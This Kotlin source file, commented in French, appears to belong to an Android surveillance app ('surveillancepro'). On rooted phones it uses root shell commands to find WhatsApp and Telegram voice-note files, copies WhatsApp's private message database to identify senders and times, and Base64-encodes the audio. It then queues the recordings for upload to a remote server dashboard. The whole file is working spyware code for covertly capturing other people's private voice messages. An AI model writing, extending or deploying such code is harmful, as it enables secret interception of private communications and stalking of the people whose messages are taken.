package com.surveillancepro.android.root

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.util.Base64
import android.util.Log
import com.surveillancepro.android.data.EventQueue
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Extraction des FICHIERS AUDIO des messages vocaux (ROOT REQUIS).
 *
 * Sans root : on sait juste "Message vocal" via la notification
 * Avec root : on récupère le FICHIER .opus/.ogg et on l'envoie au serveur
 *
 * Le serveur pourra stocker l'audio et le rendre écoutable depuis le dashboard.
 *
 * Chemins des vocaux sur Android :
 * - WhatsApp  : /sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes/
 *               ou /sdcard/WhatsApp/Media/WhatsApp Voice Notes/ (ancien)
 *               ou /data/media/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes/
 * - Telegram  : /data/data/org.telegram.messenger/files/Telegram Audio/
 *               ou /sdcard/Telegram/Telegram Audio/
 * - Signal    : fichiers dans le dossier interne de l'app
 */
object VoiceNoteExtractor {

    private const val TAG = "VoiceNoteExtractor"
    private const val MAX_AUDIO_SIZE = 3 * 1024 * 1024L // 3 Mo max par audio
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)

    data class VoiceNote(
        val app: String,
        val filePath: String,
        val filename: String,
        val sizeBytes: Long,
        val durationEstimate: Int,
        val sender: String,
        val timestamp: Long,
        val isOutgoing: Boolean,
        val audioBase64: String?,
    )

    /**
     * Extraction complète des vocaux récents de toutes les apps.
     */
    fun extractAllRecentVoiceNotes(context: Context): List<VoiceNote> {
        if (!RootManager.isRooted()) return emptyList()

        val notes = mutableListOf<VoiceNote>()
        notes.addAll(extractWhatsAppVoiceNotes(context))
        notes.addAll(extractTelegramVoiceNotes(context))
        return notes
    }

    /**
     * WhatsApp : les vocaux sont des fichiers .opus dans le dossier Voice Notes.
     * On croise avec la base de données pour avoir l'expéditeur et l'heure exacte.
     */
    private fun extractWhatsAppVoiceNotes(context: Context): List<VoiceNote> {
        val notes = mutableListOf<VoiceNote>()
        val prefs = context.getSharedPreferences("sp_voice_extract", Context.MODE_PRIVATE)
        val lastMarker = prefs.getLong("wa_voice_last", 0L)

        // Trouver le dossier des vocaux
        val possibleDirs = listOf(
            "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes",
            "/sdcard/WhatsApp/Media/WhatsApp Voice Notes",
            "/data/media/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes",
            "/data/media/0/WhatsApp/Media/WhatsApp Voice Notes",
        )

        var voiceDir: String? = null
        for (dir in possibleDirs) {
            val check = RootManager.executeRootCommand("test -d '$dir' && echo OK")
            if (check.output.trim() == "OK") { voiceDir = dir; break }
        }
        if (voiceDir == null) return notes

        // Lister les fichiers .opus récents (modifiés depuis le dernier check)
        val findCmd = if (lastMarker > 0) {
            "find '$voiceDir' -name '*.opus' -newer /data/local/tmp/.sp_voice_marker 2>/dev/null | head -30"
        } else {
            "find '$voiceDir' -name '*.opus' -mmin -1440 2>/dev/null | head -30"
        }

        val result = RootManager.executeRootCommand(findCmd)
        if (!result.success) return notes

        val files = result.output.lines().filter { it.isNotBlank() && it.endsWith(".opus") }
        if (files.isEmpty()) return notes

        // Charger les infos de la DB WhatsApp pour enrichir chaque vocal
        val voiceDbInfo = loadWhatsAppVoiceMetadata(context)

        for (filePath in files) {
            try {
                val filename = filePath.substringAfterLast("/")

                val sizeResult = RootManager.executeRootCommand("stat -c '%s' '$filePath' 2>/dev/null")
                val size = sizeResult.output.trim().toLongOrNull() ?: continue
                if (size < 100) continue

                val isSent = filePath.contains("/Sent/")

                // Essayer de trouver la durée et l'expéditeur dans la DB
                val metadata = voiceDbInfo.find { it.filename.contains(filename) }

                // Lire le fichier audio et le convertir en base64
                var audioBase64: String? = null
                if (size <= MAX_AUDIO_SIZE) {
                    audioBase64 = readFileAsBase64(filePath)
                }

                // Estimer la durée : ~1.6 Ko/s pour du opus à 16kbps
                val durationEstimate = metadata?.duration ?: (size / 1600).toInt()

                notes.add(VoiceNote(
                    app = "WhatsApp",
                    filePath = filePath,
                    filename = filename,
                    sizeBytes = size,
                    durationEstimate = durationEstimate,
                    sender = metadata?.sender ?: if (isSent) "moi" else "inconnu",
                    timestamp = metadata?.timestamp ?: (System.currentTimeMillis() / 1000),
                    isOutgoing = isSent,
                    audioBase64 = audioBase64,
                ))
            } catch (e: Exception) {
                Log.w(TAG, "Error processing voice file: ${e.message}")
            }
        }

        // Mettre à jour le marqueur
        RootManager.executeRootCommand("touch /data/local/tmp/.sp_voice_marker")
        prefs.edit().putLong("wa_voice_last", System.currentTimeMillis() / 1000).apply()

        return notes
    }

    private data class VoiceMetadata(
        val filename: String,
        val sender: String,
        val duration: Int,
        val timestamp: Long,
    )

    /**
     * Croise les fichiers vocaux avec la DB WhatsApp pour obtenir
     * l'expéditeur et la durée exacte de chaque vocal.
     */
    private fun loadWhatsAppVoiceMetadata(context: Context): List<VoiceMetadata> {
        val metadata = mutableListOf<VoiceMetadata>()
        val tmpFile = "/data/local/tmp/sp_db_voice_${System.currentTimeMillis()}.db"

        val cp = RootManager.executeRootCommand(
            "cp '/data/data/com.whatsapp/databases/msgstore.db' '$tmpFile' 2>/dev/null && chmod 644 '$tmpFile'"
        )
        if (!cp.success) return metadata

        try {
            val db = SQLiteDatabase.openDatabase(tmpFile, null, SQLiteDatabase.OPEN_READONLY)

            // media_wa_type 2 = audio, 20 = voice note (PTT)
            val cursor = db.rawQuery("""
                SELECT m.key_remote_jid, m.media_duration, m.timestamp,
                       m.media_name, m.key_from_me,
                       (SELECT subject FROM jid WHERE raw_string = m.key_remote_jid LIMIT 1) as group_name
                FROM message m
                WHERE m.media_wa_type IN (2, 20)
                ORDER BY m.timestamp DESC
                LIMIT 100
            """, null)

            while (cursor.moveToNext()) {
                val jid = cursor.getString(0) ?: continue
                val duration = cursor.getInt(1)
                val timestamp = cursor.getLong(2) / 1000
                val mediaName = cursor.getString(3) ?: ""
                val isFromMe = cursor.getInt(4) == 1
                val groupName = cursor.getString(5)

                val sender = if (isFromMe) "moi" else {
                    if (jid.contains("@g.us")) groupName ?: jid.substringBefore("@")
                    else jid.substringBefore("@")
                }

                metadata.add(VoiceMetadata(
                    filename = mediaName,
                    sender = sender,
                    duration = duration,
                    timestamp = timestamp,
                ))
            }
            cursor.close()
            db.close()
        } catch (e: Exception) {
            Log.w(TAG, "Voice metadata error: ${e.message}")
        } finally {
            File(tmpFile).delete()
        }
        return metadata
    }

    /**
     * Telegram : les vocaux sont dans le dossier Telegram Audio.
     */
    private fun extractTelegramVoiceNotes(context: Context): List<VoiceNote> {
        val notes = mutableListOf<VoiceNote>()

        val possibleDirs = listOf(
            "/sdcard/Telegram/Telegram Audio",
            "/data/media/0/Telegram/Telegram Audio",
            "/sdcard/Android/media/org.telegram.messenger/Telegram/Telegram Audio",
        )

        var audioDir: String? = null
        for (dir in possibleDirs) {
            val check = RootManager.executeRootCommand("test -d '$dir' && echo OK")
            if (check.output.trim() == "OK") { audioDir = dir; break }
        }
        if (audioDir == null) return notes

        val result = RootManager.executeRootCommand(
            "find '$audioDir' -name '*.ogg' -mmin -1440 2>/dev/null | head -20"
        )
        if (!result.success) return notes

        for (filePath in result.output.lines().filter { it.isNotBlank() }) {
            try {
                val filename = filePath.substringAfterLast("/")
                val sizeResult = RootManager.executeRootCommand("stat -c '%s' '$filePath' 2>/dev/null")
                val size = sizeResult.output.trim().toLongOrNull() ?: continue
                if (size < 100) continue

                var audioBase64: String? = null
                if (size <= MAX_AUDIO_SIZE) {
                    audioBase64 = readFileAsBase64(filePath)
                }

                val durationEstimate = (size / 1600).toInt()

                notes.add(VoiceNote(
                    app = "Telegram",
                    filePath = filePath,
                    filename = filename,
                    sizeBytes = size,
                    durationEstimate = durationEstimate,
                    sender = "inconnu",
                    timestamp = System.currentTimeMillis() / 1000,
                    isOutgoing = false,
                    audioBase64 = audioBase64,
                ))
            } catch (_: Exception) {}
        }
        return notes
    }

    /**
     * Lit un fichier via root et retourne son contenu en Base64.
     */
    private fun readFileAsBase64(filePath: String): String? {
        val tmpCopy = "/data/local/tmp/sp_audio_${System.currentTimeMillis()}"
        try {
            val cp = RootManager.executeRootCommand("cp '$filePath' '$tmpCopy' && chmod 644 '$tmpCopy'")
            if (!cp.success) return null

            val file = File(tmpCopy)
            if (!file.exists() || file.length() < 100) return null

            val bytes = file.readBytes()
            file.delete()
            RootManager.executeRootCommand("rm -f '$tmpCopy'")

            return Base64.encodeToString(bytes, Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.w(TAG, "readFileAsBase64 error: ${e.message}")
            File(tmpCopy).delete()
            return null
        }
    }

    /**
     * Extrait les vocaux et les enqueue pour envoi au serveur.
     */
    fun extractAndEnqueue(context: Context) {
        val notes = extractAllRecentVoiceNotes(context)
        if (notes.isEmpty()) return

        val queue = EventQueue.getInstance(context)

        for (note in notes) {
            val payload = mutableMapOf<String, Any>(
                "app" to note.app,
                "sender" to note.sender,
                "isOutgoing" to note.isOutgoing,
                "durationSeconds" to note.durationEstimate,
                "sizeBytes" to note.sizeBytes,
                "filename" to note.filename,
                "format" to if (note.filename.endsWith(".opus")) "opus" else "ogg",
                "messageTimestamp" to dateFormat.format(Date(note.timestamp * 1000)),
                "timestamp" to dateFormat.format(Date()),
                "source" to "root_fs",
            )

            if (note.audioBase64 != null) {
                payload["audioBase64"] = note.audioBase64
                payload["status"] = "audio_captured"
            } else {
                payload["status"] = "metadata_only"
            }

            queue.enqueue("voice_note_captured", payload)
        }

        Log.d(TAG, "Enqueued ${notes.size} voice notes (${notes.count { it.audioBase64 != null }} with audio)")
    }
}
